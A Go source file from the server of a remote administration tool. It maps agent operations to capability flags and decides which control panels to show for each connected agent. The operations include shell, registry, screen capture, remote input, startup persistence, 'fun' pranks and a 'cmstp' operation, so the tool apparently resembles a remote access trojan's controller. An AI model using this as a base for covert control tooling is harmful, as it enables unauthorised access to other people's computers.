//go:build !agent
// +build !agent

package main

import "strings"

var serverOpFeature = map[string]string{
	"drives":          "files_read",
	"list":            "files_read",
	"read":            "files_read",
	"read_chunk":      "files_read",
	"preview":         "files_read",
	"search":          "files_read",
	"write":           "files_write",
	"mkdir":           "files_write",
	"rm":              "files_write",
	"rename":          "files_write",
	"zip":             "archive",
	"power":           "power",
	"fun":             "fun",
	"messagebox":      "messagebox",
	"screen_capture":  "screen",
	"remote_input":    "remote_input",
	"processes":       "processes",
	"process_kill":    "processes",
	"process_run":     "processes",
	"registry":        "registry",
	"registry_read":   "registry",
	"shell":           "shell",
	"startup":         "startup",
	"startup_remove":  "startup",
	"logs":            "logs",
	"cmstp":           "cmstp",
	"agent_close":             "agent_control",
	"agent_relaunch":          "agent_control",
	"agent_uninstall":         "agent_control",
	"agent_startup_install":   "agent_control",
	"agent_startup_uninstall": "agent_control",
	"agent_startup_status":    "agent_control",
	"self_update":             "remote_update",
}

var controlFeatureSet = []string{
	"power", "fun", "messagebox", "screen", "processes", "registry", "shell", "startup", "logs", "cmstp", "agent_control", "remote_update",
}

var remoteFeatureSet = []string{"screen", "remote_input"}

// liteDefaultCapabilities is the capability set advertised for agents that
// don't send an explicit capabilities[] list AND whose build/version/name/key
// matches the "lite" heuristic. It needs to mirror what the Lite agent really
// implements; advertising a capability that the agent rejects only produces
// "unsupported" errors on the wire.
//
// Lite agents do implement shell and agent_control (close / relaunch /
// uninstall / startup_*) on Windows — those are wired through the same
// dispatcher as the Full agent — so we surface them by default. The Control
// Room and Shell panels light up; capability gating still kicks in for the
// remaining ops (power, fun, processes, registry, etc.) which the Lite agent
// doesn't ship.
var liteDefaultCapabilities = []string{
	"files_read",
	"files_write",
	"remote_update",
	"agent_control",
	"shell",
}

func looksLikeLiteAgent(build, version, name, key string) bool {
	for _, v := range []string{build, version, name, key} {
		if strings.Contains(strings.ToLower(strings.TrimSpace(v)), "lite") {
			return true
		}
	}
	return false
}

func effectiveCapabilities(caps []string, build, version, name, key string) ([]string, bool) {
	out := make([]string, 0, len(caps))
	for _, c := range caps {
		c = strings.TrimSpace(c)
		if c != "" {
			out = append(out, c)
		}
	}
	if len(out) > 0 {
		return out, true
	}
	if looksLikeLiteAgent(build, version, name, key) {
		return append([]string(nil), liteDefaultCapabilities...), true
	}
	// Explicit=false means legacy full-capable agent. This preserves older full Go
	// agents while still requiring remote_update to be advertised explicitly.
	return nil, false
}

func supportsCapabilityList(caps []string, feature string) bool {
	return supportsCapabilityDetails(caps, "", "", "", "", feature)
}

func supportsCapabilityDetails(caps []string, build, version, name, key, feature string) bool {
	feature = strings.TrimSpace(feature)
	if feature == "" {
		return true
	}
	eff, explicit := effectiveCapabilities(caps, build, version, name, key)
	if !explicit {
		return feature != "remote_update"
	}
	for _, c := range eff {
		c = strings.TrimSpace(c)
		if c == feature {
			return true
		}
		if c == "files" && (strings.HasPrefix(feature, "files_") || feature == "archive") {
			return true
		}
	}
	return false
}

func supportsAnyCapability(caps []string, features ...string) bool {
	if len(features) == 0 {
		return true
	}
	for _, f := range features {
		if supportsCapabilityList(caps, f) {
			return true
		}
	}
	return false
}

func supportsAnyCapabilityDetails(caps []string, build, version, name, key string, features ...string) bool {
	if len(features) == 0 {
		return true
	}
	for _, f := range features {
		if supportsCapabilityDetails(caps, build, version, name, key, f) {
			return true
		}
	}
	return false
}

func (s *server) agentSupportsFeature(ac *agentConn, feature string) bool {
	if ac == nil {
		return false
	}
	h := ac.summary
	return supportsCapabilityDetails(h.Capabilities, h.Build, h.Version, h.Name, h.Key, feature)
}

func (s *server) agentSupportsAnyFeature(ac *agentConn, features ...string) bool {
	if ac == nil {
		return false
	}
	h := ac.summary
	return supportsAnyCapabilityDetails(h.Capabilities, h.Build, h.Version, h.Name, h.Key, features...)
}

func (s *server) agentSupportsOp(ac *agentConn, op string) (bool, string) {
	if ac == nil {
		return false, "offline"
	}
	feature := serverOpFeature[op]
	if feature == "" {
		return true, ""
	}
	if s.agentSupportsFeature(ac, feature) {
		return true, feature
	}
	return false, feature
}

func pageFeatureFlags(ac *agentConn) map[string]any {
	caps := []string(nil)
	build, version, name, key := "", "", "", ""
	if ac != nil {
		caps = ac.summary.Capabilities
		build = ac.summary.Build
		version = ac.summary.Version
		name = ac.summary.Name
		key = ac.summary.Key
	}
	can := func(feature string) bool {
		if ac == nil {
			return false
		}
		return supportsCapabilityDetails(caps, build, version, name, key, feature)
	}
	return map[string]any{
		"Capabilities":    caps,
		"CanFilesRead":    can("files_read"),
		"CanFilesWrite":   can("files_write"),
		"CanArchive":      can("archive"),
		"CanServerZip":    can("files_read"),
		"CanSearch":       can("files_read"),
		"CanPower":        can("power"),
		"CanFun":          can("fun"),
		"CanMessagebox":   can("messagebox"),
		"CanScreen":       can("screen"),
		"CanRemoteInput":  can("remote_input"),
		"CanProcesses":    can("processes"),
		"CanRegistry":     can("registry"),
		"CanShell":        can("shell"),
		"CanStartup":      can("startup"),
		"CanAgentControl": can("agent_control"),
		"CanRemoteUpdate": can("remote_update"),
		"ShowControl":     true,
		"ShowRemote":      ac != nil && supportsAnyCapabilityDetails(caps, build, version, name, key, remoteFeatureSet...),
	}
}

func (s *server) pageDataForSession(se *session, extra map[string]any) map[string]any {
	_, ac := s.selectedAgentFor(se)
	data := pageFeatureFlags(ac)
	for k, v := range extra {
		data[k] = v
	}
	return data
}
